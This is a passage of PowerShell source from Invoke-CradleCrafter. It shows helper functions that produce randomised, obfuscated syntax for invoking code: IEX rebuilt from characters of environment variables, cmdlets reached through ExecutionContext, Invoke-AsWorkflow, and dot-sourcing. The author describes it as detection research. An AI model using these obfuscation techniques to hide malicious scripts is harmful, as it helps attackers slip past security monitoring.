                $InvokeSyntax += "'$RandomInvokeVarName'|$ForEach{$SetRandomInvokeVarName$PowerShellCreatePotentiallyEncapsulated}{$Void$GetRandomInvokeVarName.$AddScriptWithVariable(($InvokeTag))}{$Void$GetRandomInvokeVarName.$AddScriptWithVariable({$CommandTag})}{$GetRandomInvokeVarName.Invoke()}{$GetRandomInvokeVarName.$DisposeMethodWithVariable}"
                $InvokeSyntax += "'$RandomInvokeVarName'|$ForEach{$SetRandomInvokeVarName$PowerShellCreatePotentiallyEncapsulated}{$Void$GetRandomInvokeVarName.$AddScriptWithVariable(($InvokeTag)).$AddScriptWithVariable({$CommandTag})}{$GetRandomInvokeVarName.Invoke()}{$GetRandomInvokeVarName.$DisposeMethodWithoutVariable}"
                $InvokeSyntax += "[PowerShell]::Create().$AddScriptWithoutVariable(($InvokeTag)).$AddScriptWithoutVariable({$CommandTag}).Invoke()"
                $InvokeSyntax += "[PowerShell]::Create().$AddScriptWithoutVariable(($InvokeTag|$ForEach{$CurrentItemVariable$CommandEscapedStringTag})).Invoke()"
            }
            Else
            {
                # Generate numerous ways to invoke $InvokeTag.
                $InvokeSyntax  = @()
                $InvokeSyntax += "'$RandomInvokeVarName'|$ForEach{$SetRandomInvokeVarName$PowerShellCreatePotentiallyEncapsulated}{$Void$GetRandomInvokeVarName.$AddScriptWithVariable(($InvokeTag))}{$GetRandomInvokeVarName.Invoke()}{$GetRandomInvokeVarName.Dispose()}"
                $InvokeSyntax += "[PowerShell]::Create().$AddScriptWithoutVariable(($InvokeTag)).Invoke()"
            }
            # Select random option from above.
            $Result = Get-Random -Input $InvokeSyntax
        }
        9 {
            # Concatenated IEX  --> .($env:ComSpec[4,15,25]-Join''), etc.

            # Substitution tags for JOIN and STRING syntaxes used by certain values in $ConcatenatedIEX in below step.
            $JoinTag      = '<VALUETOJOIN>'
            $JoinSyntax   = Get-Random -Input @("($JoinTag-Join'')","(-Join($JoinTag))","([String]::Join('',($JoinTag)))")
            $StringTag    = "<STRINGTOREPLACE>"
            $StringSyntax = Get-Random -Input @("([String]$StringTag)","$StringTag.ToString()")

            # Random wildcard strings for variables used in $ConcatenatedIEX array in below step.
            $ShellId1      = (Get-Random -Input @('ShellId','She*d','S*Id','S*ell*d'))
            $ShellId2      = (Get-Random -Input @('ShellId','She*d','S*Id','S*ell*d'))
            $PsHome1       = (Get-Random -Input @('PsHome','PsH*','P*ho*','P*ome'))
            $PsHome2       = (Get-Random -Input @('PsHome','PsH*','P*ho*','P*ome'))
            $Env_Public    = (Get-Random -Input @('env:','env:\','env:/')) + (Get-Random -Input @('Public','P*ic','Pub*','*ic','*lic','*b*ic'))
            $Env_Public2   = (Get-Random -Input @('env:','env:\','env:/')) + (Get-Random -Input @('Public','P*ic','Pub*','*ic','*lic','*b*ic'))
            $Env_ComSpec   = (Get-Random -Input @('env:','env:\','env:/')) + (Get-Random -Input @('ComSpec','C*S*c','Co*pec','*o*pec','*o*S*ec'))
            $MaxDriveCount = (Get-Random -Input @('MaximumDriveCount','M*Dr*','Ma*D*','*i*D*i*e*t','*i*D*o*nt','*mumD*un*t'))
            $VerbosePref   = (Get-Random -Input @('VerbosePreference','Ve*e','Verb*','*bos*e','*r*os*e','*seP*e'))

            # The below code block is copy/pasted from the Out-EncapsulatedInvokeExpression function from Invoke-Obfuscation's Out-ObfuscatedStringCommand.ps1.
            # Changes to the Out-EncapsulatedInvokeExpression function in the Invoke-Obfuscation project should be copied into below InvokeExpressionSyntax block and vice versa.
            # Generate random invoke operation syntax.
            $ConcatenatedIEX  = @()
            # Added below slightly-randomized obfuscated ways to form the string 'iex' and then invoke it with . or &.
            # Though far from fully built out, these are included to highlight how IEX/Invoke-Expression is a great indicator but not a silver bullet.
            # These methods draw on common environment variable values and PowerShell Automatic Variable values/methods/members/properties/etc.
            $ConcatenatedIEX += $InvocationOperator + "( " + (Out-GetVariable $ShellId1) + "[1]+" + (Out-GetVariable $ShellId2) + "[13]+'x')"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Out-GetVariable $PSHome1) + "[" + (Get-Random -Input @(4,21)) + "]+" + (Out-GetVariable $PSHome2) + "[" + (Get-Random -Input @(30,34)) + "]+'x')"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Out-GetVariable $Env_Public) + "[13]+" + (Out-GetVariable $Env_Public2) + "[5]+'x')"
            $ConcatenatedIEX += $InvocationOperator + $JoinSyntax.Replace($JoinTag,((Out-GetVariable $Env_ComSpec) + "[4," + (Get-Random -Input @(15,24,26)) + ",25]"))
            $ConcatenatedIEX += $InvocationOperator + $JoinSyntax.Replace($JoinTag,("(" + (Get-Random -Input @('Get-Variable','GV','Variable')) + " $MaxDriveCount).Name[3,11,2]"))
            $ConcatenatedIEX += $InvocationOperator + '(' + $JoinSyntax.Replace($JoinTag,$StringSyntax.Replace($StringTag,(Out-GetVariable $VerbosePref)) + '[1,3]') + "+'x')"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.Insert)"         , "''.Insert.ToString()"))         + '[' + (Get-Random -Input @(3,7,14,23,33)) + ',' + (Get-Random -Input @(10,26,41)) + ",27]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.Normalize)"      , "''.Normalize.ToString()"))      + '[' + (Get-Random -Input @(3,13,23,33,55,59,77)) + ',' + (Get-Random -Input @(15,35,41,45)) + ",46]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.Chars)"          , "''.Chars.ToString()"))          + '[' + (Get-Random -Input @(11,15)) + ',' + (Get-Random -Input @(18,24)) + ",19]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.SubString)"      , "''.SubString.ToString()"))      + '[' + (Get-Random -Input @(3,13,17,26,37,47,51,60,67)) + ',' + (Get-Random -Input @(29,63,72)) + ',' + (Get-Random -Input @(30,64)) + "]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.Remove)"         , "''.Remove.ToString()"))         + '[' + (Get-Random -Input @(3,14,23,30,45,56,65)) + ',' + (Get-Random -Input @(8,12,26,50,54,68)) + ',' + (Get-Random -Input @(27,69)) + "]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.LastIndexOfAny)" , "''.LastIndexOfAny.ToString()")) + '[' + (Get-Random -Input @(0,8,34,42,67,76,84,92,117,126,133)) + ',' + (Get-Random -Input @(11,45,79,95,129)) + ',' + (Get-Random -Input @(12,46,80,96,130)) + "]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.LastIndexOf)"    , "''.LastIndexOf.ToString()"))    + '[' + (Get-Random -Input @(0,8,29,37,57,66,74,82,102,111,118,130,138,149,161,169,180,191,200,208,216,227,238,247,254,266,274,285,306,315,326,337,345,356,367,376,393,402,413,424,432,443,454,463,470,491,500,511)) + ',' + (Get-Random -Input @(11,25,40,54,69,85,99,114,141,157,172,188,203,219,235,250,277,293,300,333,348,364,379,387,420,435,451,466,485,518)) + ',' + (Get-Random -Input @(12,41,70,86,115,142,173,204,220,251,278,349,380,436,467)) + "]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.IsNormalized)"   , "''.IsNormalized.ToString()"))   + '[' + (Get-Random -Input @(5,13,26,34,57,61,75,79)) + ',' + (Get-Random -Input @(15,36,43,47)) + ",48]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.IndexOfAny)"     , "''.IndexOfAny.ToString()"))     + '[' + (Get-Random -Input @(0,4,30,34,59,68,76,80,105,114,121)) + ',' + (Get-Random -Input @(7,37,71,83,117)) + ',' + (Get-Random -Input @(8,38,72,84,118)) + "]-Join''" + ")"
            $ConcatenatedIEX += $InvocationOperator + "( " + (Get-Random -Input @("([String]''.IndexOf)"        , "''.IndexOf.ToString()"))        + '[' + (Get-Random -Input @(0,4,25,29,49,58,66,70,90,99,106,118,122,133,145,149,160,171,180,188,192,203,214,223,230,242,246,257,278,287,298,309,313,324,335,344,361,370,381,392,396,407,418,427,434,455,464,475)) + ',' + (Get-Random -Input @(7,21,32,46,61,73,87,102,125,141,152,168,183,195,211,226,249,265,272,305,316,332,347,355,388,399,415,430,449,482)) + ',' + (Get-Random -Input @(8,33,62,74,103,126,153,184,196,227,250,317,348,400,431)) + "]-Join''" + ")"

            # Select random option from above.
            $ConcatenatedIEX = Get-Random -Input $ConcatenatedIEX

            $Result = Get-Random -Input @(($ConcatenatedIEX + $InvokeTag),($InvokeTag + '|' + $ConcatenatedIEX))
        }
        10 {
            # Invoke-AsWorkflow (PS 3.0+)
            
            # Handle syntax differently if PostCradleCommand is present or not since it will need to be combined with our regular cradle result since everything must be executed within the same ScriptBlock/RunSpace.
            If($Command)
            {
                $Result = "Invoke-AsWorkflow $ExpressionFlagSubString ($InvokeTag$CommandEscapedStringTag)"
            }
            Else
            {
                $Result = "Invoke-AsWorkflow $ExpressionFlagSubString ($InvokeTag)"
            }
        }
        11 {
            # Dot-Source (Disk-Based Invocation)
            
            $Result = ". $PathTag"
        }
        12 {
            # Import-Module/IPMO (Disk-Based Invocation)
            
            $Result = (Get-Random -Input @('Import-Module','IPMO')) + " $PathTag"
        }
        default {Write-Error "An invalid `$InvokeLevel value ($InvokeLevel) was passed to switch block for Out-EncapsulatedInvokeExpression."; Exit}
    }

    Return $Result
}


Function Out-PsGetCmdlet
{
<#
.SYNOPSIS

HELPER FUNCTION :: Generates random syntax for invoking a cmdlet (denoted by $VarString) via the GetCommand, GetCmdlet, and GetCmdlets methods found in $ExecutionContext.InvokeCommand. GetCommands method is excluded since it was introduced in PS3.0.

Invoke-CradleCrafter Function: Out-PsGetCmdlet
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-PsGetCmdlet generates random syntax for invoking a cmdlet (denoted by $VarString) via the GetCommand, GetCmdlet, and GetCmdlets methods found in $ExecutionContext.InvokeCommand. GetCommands method is excluded since it was introduced in PS3.0.

.PARAMETER VarString

Specifies the name of the cmdlet (or search string with wildcards) to be retrieved.

.EXAMPLE

C:\PS> Out-PsGetCmdlet 'N*ct'

&$ExecutionContext.InvokeCommand.GetCmdlets('N*ct')

C:\PS> Out-PsGetCmdlet '*w-*ct'

.$ExecutionContext.InvokeCommand.GetCmdlet($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|Where-Object{(Item Variable:_).Value.Name-like'G*om*e'}).Name).Invoke('*w-*ct',1,1))

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $VarString
    )

    # Set boolean to see if additional syntax not compatible with wildcards can be used.
    $NoWildcards = $TRUE
    If($VarString.Contains('*'))
    {
        $NoWildcards = $FALSE
    }

    # Generate random boolean True and cmdlet type syntaxes.
    $BooleanTrue  = Get-Random -Input @(1,'$TRUE')
    $BooleanTrue2 = Get-Random -Input @(1,'$TRUE')
    $CmdletType   = Get-Random -Input @('[System.Management.Automation.CommandTypes]::Cmdlet','[Management.Automation.CommandTypes]::Cmdlet')

    # Generate numerous ways to execute the passed in variable via PS 1.0 GetCmdlet (and similar) syntax.
    $GetCmdletSyntaxOptions  = @()
    $GetCmdletSyntaxOptions += $InvocationOperator + "$ExecContextVariable.$InvokeCommand.$GetCmdlets('$VarString')"
    $GetCmdletSyntaxOptions += $InvocationOperator + "$ExecContextVariable.$InvokeCommand.$GetCmdlet($ExecContextVariable.$InvokeCommand.$GetCommandName('$VarString',$BooleanTrue,$BooleanTrue2))"
    $GetCmdletSyntaxOptions += $InvocationOperator + "$ExecContextVariable.$InvokeCommand.$GetCommand($ExecContextVariable.$InvokeCommand.$GetCommandName('$VarString',$BooleanTrue,$BooleanTrue2),$CmdletType)"
    If($NoWildcards)
    {
        $GetCmdletSyntaxOptions += $InvocationOperator + "$ExecContextVariable.$InvokeCommand.$GetCmdlet('$VarString')"
        $GetCmdletSyntaxOptions += $InvocationOperator + "$ExecContextVariable.$InvokeCommand.$GetCommand('$VarString',$CmdletType)"
    }
    # Select random option from above.
    $GetCmdletSyntax = Get-Random -Input $GetCmdletSyntaxOptions
    
    Return $GetCmdletSyntax
}


Function Out-GetVariable
{
<#
.SYNOPSIS

HELPER FUNCTION :: Generates random syntax for performing Get-Variable functionality for variables and environment variables.

Invoke-CradleCrafter Function: Out-GetVariable
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-GetVariable generates random syntax for performing Get-Variable functionality for variables and environment variables.

.PARAMETER VarName

Specifies the name of the variable (or environment variable).

.EXAMPLE

C:\PS> Out-GetVariable 'varName'

$varName

C:\PS> Out-GetVariable 'varName'

(GV varName -ValueO)

C:\PS> Out-GetVariable 'varName'

(GI Variable:\varName).Value

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $VarName
    )

    # Change $VariableType variable to handle Variable by default but also environment variables if input $VarName starts with 'Env:'.
    $VariableType = Get-Random -Input @('Variable:','Variable:\','Variable:/')
    If($VarName.ToLower().StartsWith('env:'))
    {
        $VariableType = ''
    }

    # Generate random substring of -ValueOnly flag.
    $FullArgument           = "-ValueOnly"
    $ValueOnlyFlagSubString = $FullArgument.SubString(0,(Get-Random -Minimum 3 -Maximum ($FullArgument.Length)))

    # Generate numerous ways to reference the input $VarName variable, including Get-Variable varname, Get-ChildItem Variable:varname, Get-Item Variable:varname, etc.
    $VariableSyntax  = @()
    If(!($VarName.Contains('*')))
    {
        # Do not use standard '$' variable syntax if the input variable name contains wildcards.
        $VariableSyntax += '$' + $VarName.Replace(':\',':').Replace(':/',':')
    }
    $VariableSyntax += '(' + (Get-Random -Input @('DIR','Get-ChildItem','GCI','ChildItem','LS','Get-Item','GI','Item')) + " $VariableType$VarName).Value"
    If(!($VarName.ToLower().StartsWith('env:')))
    {
        # Do not use Get-Variable/GV/Variable syntax if the variable name contains 'env:' meaning it is an environment variable.
        $VariableSyntax += '(' + (Get-Random -Input @('Get-Variable','GV','Variable')) + ' ' + (Get-Random -Input @("$VarName).Value","$VarName $ValueOnlyFlagSubString)"))
    }

    # Select random option from above.
    $Result = Get-Random -Input $VariableSyntax

    Return $Result
}


Function Out-SetVariable
{
<#
.SYNOPSIS

HELPER FUNCTION :: Generates random syntax for performing Set-Variable functionality for variables and environment variables.

Invoke-CradleCrafter Function: Out-SetVariable
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-SetVariable generates random syntax for performing Set-Variable functionality for variables and environment variables.

.PARAMETER VarName

Specifies the name of the variable (or environment variable).

.EXAMPLE

C:\PS> Out-SetVariable 'varName'

$varName=

C:\PS> Out-SetVariable 'varName'

Set-Variable varName

C:\PS> Out-SetVariable 'varName'

SI Variable:/varName

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $VarName
    )

    # Change $VariableType variable to handle Variable by default but also environment variables if input $VarName starts with 'Env:'.
    $VariableType = Get-Random -Input @('Variable:','Variable:\','Variable:/')
    If($VarName.ToLower().StartsWith('env:'))
    {
        $VariableType = ''
    }
    
    # Generate random substring of -Value flag.
    $FullArgument              = "-Value"
    $ValueFlagSubString        = $FullArgument.SubString(0,(Get-Random -Minimum 3 -Maximum ($FullArgument.Length)))

    # Generate numerous ways to reference the input $VarName variable, including Set-Variable varname, Set-Item Variable:varname, New-Item Variable:varname, etc.
    $VariableSyntax  = @()
    If(!($VarName.Contains('*'))) {$VariableSyntax += '$' + $VarName + '='}
    $VariableSyntax += (Get-Random -Input @('Set-Variable','SV')) + ' ' + $VarName + ' '
    $VariableSyntax += (Get-Random -Input @('Set-Item','SI')) + ' ' + "$VariableType$VarName" + ' '
    #$VariableSyntax += (Get-Random -Input @('New-Item','NI')) + ' ' + "$VariableType$VarName" + ' ' + $ValueFlagSubString + ' '
    # Commenting New-Item/NI above. Technically it works but in repeat testing in Invoke-CradleCrafter if you don't remove the variable then the command will fail when trying to create an existing variable.

    # Select random option from above.
    $Result = Get-Random -Input $VariableSyntax

    Return $Result
}